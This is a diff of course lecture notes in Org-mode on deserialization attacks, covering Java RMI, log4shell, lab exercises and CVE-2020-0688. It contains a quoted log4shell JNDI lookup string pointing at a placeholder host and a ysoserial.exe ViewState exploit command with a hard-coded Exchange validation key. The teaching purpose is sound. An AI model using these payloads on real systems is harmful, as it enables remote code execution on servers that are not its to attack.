@@ -1,19 +1,7 @@
 * Deserialization attacks
-:PROPERTIES:
-:CUSTOM_ID: deserialization-attacks
-:END:
-** Ethical hacking 2023
-:PROPERTIES:
-:CUSTOM_ID: ethical-hacking-2023
-:END:
-** Alessandro Bruni
-:PROPERTIES:
-:CUSTOM_ID: alessandro-bruni
-:END:
+
 * Intro
-:PROPERTIES:
-:CUSTOM_ID: intro
-:END:
+
 - serialization/deserialization is a widely-used concept in modern
   languages for storing objects (structured data)
 
@@ -56,18 +44,14 @@ destruct hella
 #+end_example
 
 ** The problem?
-:PROPERTIES:
-:CUSTOM_ID: the-problem
-:END:
+
 Object integrity is lost once you pass it through some untrusted
 channel - give it to the user to store some temporary data (think
 authentication cookies stored this way) - send over the network - store
 it in a database
 
 ** The solution?
-:PROPERTIES:
-:CUSTOM_ID: the-solution
-:END:
+
 - sanity checks required: e.g. cryptographically sign serialized objects
   to maintain integrity
 - Java (e.g. RMI) does type checking: the receiving end deserializes the
@@ -75,27 +59,19 @@ it in a database
   object
 
 ** OWASP resources
-:PROPERTIES:
-:CUSTOM_ID: owasp-resources
-:END:
-- [[https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/][A08:2021
-  -- Software and Data Integrity Failures]]
-- [[https://www.owasp.org/index.php/Deserialization_Cheat_Sheet][Deserialization
-  cheatsheet]]
+
+- [[https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/][A08:2021 -- Software and Data Integrity Failures]]
+- [[https://www.owasp.org/index.php/Deserialization_Cheat_Sheet][Deserialization cheatsheet]]
 
 * Exercise: OWASP WebGoat
-:PROPERTIES:
-:CUSTOM_ID: exercise-owasp-webgoat
-:END:
+
 - Run the following docker image:
   https://hub.docker.com/r/webgoat/goatandwolf
 
 - Go through A08 - software and data integrity
 
 ** Exercise: do Natas 26
-:PROPERTIES:
-:CUSTOM_ID: exercise-do-natas-26
-:END:
+
 http://natas26.natas.labs.overthewire.org/
 
 #+begin_example
@@ -104,9 +80,7 @@ password = oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 #+end_example
 
 ** Remote Code Execution with destructors
-:PROPERTIES:
-:CUSTOM_ID: remote-code-execution-with-destructors
-:END:
+
 - RMI receives an object of a class present in your classpath
 - constructs the object, checks the type (mismatch), destroys the object
 - the destructor executes arbitrary code from the user
@@ -114,28 +88,21 @@ password = oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
   arbitrary code upon destruction, you have a path to RCE
 
 ** Exercise: Deserialize to B()
-:PROPERTIES:
-:CUSTOM_ID: exercise-deserialize-to-b
-:END:
+
 [[./code/3-deserialization/Serial.java][Serial.java]]
 
 ** Exercise: Serial Killer
-:PROPERTIES:
-:CUSTOM_ID: exercise-serial-killer
-:END:
+
 - download ysoserial
 - go to
   https://github.com/archang31/aacs4-writeups/tree/master/BinaryExploitation/SerialKiller
 
 ** log4shell [[[https://en.wikipedia.org/wiki/Log4Shell#Behavior][wikipedia]]]
-:PROPERTIES:
-:CUSTOM_ID: log4shell-wikipedia
-:END:
+
 
 #+begin_quote
 The Java Naming and Directory Interface (JNDI) allows for lookup of Java
 objects at program runtime given a path to their data. [...]
-
 #+end_quote
 
 #+begin_quote
@@ -147,14 +114,12 @@ loaded as Java object data. =${jndi:ldap://example.com/file}= [...] will
 load data from that URL if connected to the Internet. By inputting a
 string that is logged, an attacker can load and execute malicious code
 hosted on a public URL. [...]
-
 #+end_quote
 
 #+begin_quote
 Because HTTP requests are frequently logged, a common attack vector is
 placing the malicious string in the HTTP request URL or a commonly
 logged HTTP header, such as User-Agent.
-
 #+end_quote
 
 #+begin_quote
@@ -165,39 +130,28 @@ solutions can be circumvented by obfuscating the request:
 after performing the lowercase operation on the letter =j=. Even if an
 input, such as a first name, is not immediately logged, it may be later
 logged during internal processing and its contents executed.
-
 #+end_quote
 
-#+caption: log4shell diagram
+#+caption: log4shell diagra
 [[file:img/log4j_attack.jpg]]
 
-Source:
-[[https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/][Swiss
-CERT]]
+Source: [[https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/][Swiss CERT]]
 
 More resources:
 [[https://github.com/pentesterland/Log4Shell][pentesterland]]
 
 ** Exercise: exploit log4shell
-:PROPERTIES:
-:CUSTOM_ID: exercise-exploit-log4shell
-:END:
+
 - Join [[https://tryhackme.com/room/solar][tryhackme/solar]]
-- Follow the [[https://www.youtube.com/watch?v=PGJVLjgC2e4][video
-  walkthrough by cryptocat]]
+- Follow the [[https://www.youtube.com/watch?v=PGJVLjgC2e4][video walkthrough by cryptocat]]
 
 * JEP 290
-:PROPERTIES:
-:CUSTOM_ID: jep-290
-:END:
+
 - [[http://openjdk.java.net/jeps/290][JEP 290]]
-- [[https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/][Attacking
-  Java RMI services after JEP 290]]
+- [[https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/][Attacking Java RMI services after JEP 290]]
 
 ** [[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688][CVE-2020-0688]]: RCE on MS Exchange
-:PROPERTIES:
-:CUSTOM_ID: cve-2020-0688-rce-on-ms-exchange
-:END:
+
 - Released Feb.25 2020
 
 - Exchange servers had the same =validationKey= and =decryptionKey= on
@@ -215,35 +169,21 @@ More resources:
 ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo OOOPS!!! > c:/Vuln_Server.txt" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="05ae4b41-51e1-4c3a-9241-6b87b169d663" --isdebug –islegacy
 #+end_example
 
-- 
-  #+caption: image.png
-  [[attachment:image.png]]
+[[attachment:image.png]]
 
-Source:
-[[https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys][Zero
-Day Initiative]]
+Source: [[https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys][Zero Day Initiative]]
 
 * Back to first principles
-:PROPERTIES:
-:CUSTOM_ID: back-to-first-principles
-:END:
+
 #+caption: image.png
 [[file:img/4-deserialization-attacks_files/image.png]]
 
 * References
-:PROPERTIES:
-:CUSTOM_ID: references
-:END:
-- [[http://frohoff.github.io/appseccali-marshalling-pickles/][Marshalling
-  Pickles (Slides + Video)]]
-- [[https://github.com/frohoff/ysoserial][ysoserial: Deserialization
-  attack framework for Java]]
-- [[https://github.com/pwntester/ysoserial.net][ysoserial.net: .NET
-  deserialization attack framework]]
-- [[https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2012/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf][Are
-  you my type - blackhat 2012]]
-- [[https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys][Remote
-  code execution on Microsoft Exchange]]
-- [[https://www.youtube.com/watch?v=w2F67LbEtnk][Log4j vulnerability
-  explained]]
+
+- [[http://frohoff.github.io/appseccali-marshalling-pickles/][Marshalling Pickles (Slides + Video)]]
+- [[https://github.com/frohoff/ysoserial][ysoserial: Deserialization attack framework for Java]]
+- [[https://github.com/pwntester/ysoserial.net][ysoserial.net: .NET deserialization attack framework]]
+- [[https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2012/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf][Are you my type - blackhat 2012]]
+- [[https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys][Remote code execution on Microsoft Exchange]]
+- [[https://www.youtube.com/watch?v=w2F67LbEtnk][Log4j vulnerability explained]]
 - https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/
